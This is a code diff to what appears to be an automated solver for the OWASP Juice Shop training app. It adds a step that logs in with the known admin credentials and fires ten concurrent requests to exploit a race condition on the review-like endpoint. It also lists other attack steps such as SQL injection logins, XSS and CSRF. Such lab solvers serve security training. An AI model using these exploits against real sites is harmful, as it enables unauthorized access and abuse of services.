@@ -279,6 +279,38 @@ def _forged_coupon(c):
         pass
 
 
+def _multiple_likes(c):
+    """Multiple Likes — race the like endpoint (concurrent POSTs) so the check-then-push isn't
+    atomic and the same email lands in a review's likedBy more than twice."""
+    import json as _j
+    import threading
+    import urllib.request as _u
+    base = str(c.base_url).rstrip("/")
+    a = _login(c, "admin@juice-sh.op", "admin123")
+    tok = a.get("token")
+    if not tok:
+        return
+    try:
+        revs = c.get("/rest/products/1/reviews").json().get("data", [])
+        rid = revs[0]["_id"] if revs else None
+        if not rid:
+            return
+
+        def _like():
+            try:
+                _u.urlopen(_u.Request(base + "/rest/products/reviews", data=_j.dumps({"id": rid}).encode(),
+                           headers={"Content-Type": "application/json", "Authorization": "Bearer " + tok}), timeout=8)
+            except Exception:
+                pass
+        ts = [threading.Thread(target=_like) for _ in range(10)]
+        for t in ts:
+            t.start()
+        for t in ts:
+            t.join()
+    except Exception:
+        pass
+
+
 def _change_bender(c):
     """Change Bender's Password — SQLi-login as Bender (id 3), then change to the canonical
     'slurmCl4ssic' with NO current password (endpoint only checks current when one is given)."""
@@ -406,7 +438,8 @@ def solve(base_url: str) -> dict:
         for step in (_sqli_logins, _known_cred_logins, _known_login_challenges, _registrations,
                      _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud,
                      _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders,
-                     _forged_coupon, _two_factor, _feedback_patterns, _csrf, _change_bender):
+                     _forged_coupon, _two_factor, _feedback_patterns, _csrf, _change_bender,
+                     _multiple_likes):
             try:
                 step(c)
             except Exception:
